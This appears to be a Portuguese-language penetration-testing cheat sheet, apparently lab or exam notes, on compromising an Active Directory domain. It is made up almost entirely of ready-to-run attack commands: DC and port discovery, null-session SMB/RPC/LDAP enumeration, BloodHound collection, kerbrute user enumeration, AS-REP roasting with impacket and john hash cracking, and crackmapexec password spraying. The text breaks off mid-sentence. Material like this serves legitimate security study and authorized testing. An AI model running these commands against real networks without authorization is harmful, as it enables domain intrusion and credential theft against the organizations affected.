---
description: >-
  Nesse primeiro momento o objetivo é comoprometer uma máquina do domínio com as
  técnicas e comandos empregadas nesta página.
---

# Active Directory

## 1 - Enumerar IP dos DCs, portas/serviços e nome de domínio

### 1 - Obtém IP address do DC (domain controller)

Como primeiro objetivo temos que levar em conta a enumeração de portas/serviços por meio do nmap e enumerar nome do domínio, assim como o IP dos domains controllers:

### linux

```
nslookup -type=srv _ldap._tcp.dc._msdcs.redecorp.br
nslookup -type=srv _kerberos._tcp.EXMAPLE.COM
nslookup -type=srv _kpasswd._tcp.EXAMPLE.COM
nslookup -type=srv _ldap._tcp.EXAMPLE.COM
nslookup -type=srv _ldap._tcp.dc._msdcs.EXAMPLE.COM
```

#### windows

```
nslookup
set type=all
_ldap._tcp.dc._msdcs.redecorp.br
```

Outra opção seria:

<pre><code><strong>nltest /dclist:oscp.exam
</strong>
nltest /dclist:domainname
</code></pre>

Vale considerar que este útlimo comando só funciona se a máquina já está no domínio.

### 2 - Obtém Dominio

```python
enum4linux -a <hostname>
#uma outra opção seria:
enum4linux -a -A <hostname>
```

**atenção com este comando, porque o domínio que me retornou não foi o mesmo identificado no comando anterior.**

```python
crackmapexec smb <hostname>
```

### 3 - Obtém serviços

basic nmap TCP [nmap\_enum](https://app.gitbook.com/o/2Zy5rWlDaAhU300B2fZ9/s/G7hJBZ74BeKBgUnukZ44/scripts/nmap\_enum)

```
sudo nmap_enum <hostname> | tee nmap_output.txt
```

basic nmap UDP

```
sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn <hostname> | tee nmap_udp_output.txt
```

All ports nmap

```
sudo nmap -p- -Pn -T5 -n <hostname> | tee nmap_fullportstcp_output.txt
```

```
sudo nmap -p- --max-retries 1 -Pn -T5 -n <hostname> | tee nmap_fullportstcp_output.txt
```

Vulns scan nmap

```
sudo nmap -sS --script vuln -n -T5 -Pn <hostname> -p <ports> | tee nmap_vulns.txt
```

Esta última porta pode ser vista com mais detalhes em:

[..](../ "mention")

Como exemplo mais comum encontrados nos cenários, segue as enumerações mais convenientes para os ambientes de ADs (mas nãoo se resume somente a isso, é necessário cosultar melhor as demais informações no link acima)...

### Enumerate shares null session

```python
smbclient -U '' -N -L <hostname>
```

```
crackmapexec smb <hostname> -u '' -p '' --shares
```

```
sudo nmap -p 445,139 -Pn -T5 <hostname> --script smb-enum-shares
```

**GUEST ACCESS**

```
smbclient -U 'guest%' -N -L <hostanme>
```

```
crackmapexec smb <hostname> -u '' -p '' --shares
```

### RPC null session

```
rpcclient -N -U '' <hostname>
```

```python
srvinfo
querydominfo
enumdomusers
enumdomgroups
querygroup 0x200
netshareenum
netshareenumall
```

### Enumerate LDAP

```
ldapsearch -x -H ldap://10.10.10.179 -s base
```

### Enumerar domínio

```
bloodhound-python -d <domain_name> -v --zip -c All -dc test.local -ns 10.10.10.1
```

## 2 - Enumeração de usuário de domínio

Aqui vale considerar que, por meio da enumeração devemos considerar os possíveis arquivos existentes que conseguimos obter e fazer possíveis nomes de usuários com esses conteúdos,. No demais, seguem comandos que podem nos auxiliar quanto a esta tarefa:

### Via Kerberos

```
kerbrute userenum -d <domain> --dc <hostname> users_temp.txt
```

```
kerbrute userenum --domain <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc <hostname>
```

```
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='test.local',userdb=usernames.txt <hostname>
```

### Via RPC

```
rpcclient -U <domain>/<username> <hostname>
```

```
rpcclient -U "DOMAIN\\" <hostnames> -N
```

```
enumdomusers
enumdomgroups
```

### Enum4linux

```
enum4linux -u <username> -p <password> -U 10.10.10.179
```

### Via SMB

```
crackmapexec smb <hostname> --users
```

### Ldapsearch

```
ldapsearch -x -H ldap://<hostname> -D '' -w '' -b "DC=<domain_name>,DC=<tld>"
```

### Via Web

Não existe um comando específico para obter noomes de usuários específicos, por motivos óbvios, porém, podemos gerar possíveis nomes de usuários com o cewl, com o seguinte comando:

```
cewl http://<hostname>/ > users_temp.txt
```

## 3 - Obter hashes de senha/senha ou exploits de serviços expostos e brute force

Este ponto é bem interessante, porque aqui temos várias possibilidades disponíveis e algumas delas deixarei documentado em uma outra página que depois deixarei o link. Mas para fins de AD, podemos considerar os principais que seriam:

### AS-REP Roasting

```
impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ -usersfile users_temp.txt -format john -outputfile hashes_temp.txt
```

Se der sucesso:

```
john --format=krb5asrep -w /usr/share/wordlists/rockyou.txt hashes_temp.txt
```

### Exploração de serviço

Neste caso, devemos considerar outra página para conseguir algum tipo de exploração. De modo geral, são:

Web - SQLi

CVEs

Chaves expostas por meio de aplicações web

Exposição de senhas via GPP - Group.xml

### Password Spray

Aqui podemos aplicar algumas técnicas sendo elas user = password, mais os usuários que já temos no dicionário:

```
cat users.txt > passwords.txt
```

```
crackmapexec ldap hosts.txt -u users.txt -p P@ssword! --continue
    
crackmapexec smb hosts.txt -u users.txt -p passwords_test.txt --continue
    
crackmapexec winrm hosts.txt -u users.txt -p passwords_test.txt --continue
```

###

Depois disso precisamos enumerar o domínio. Aqui temos duas possibilidades, sendo elas com&#x20;

####
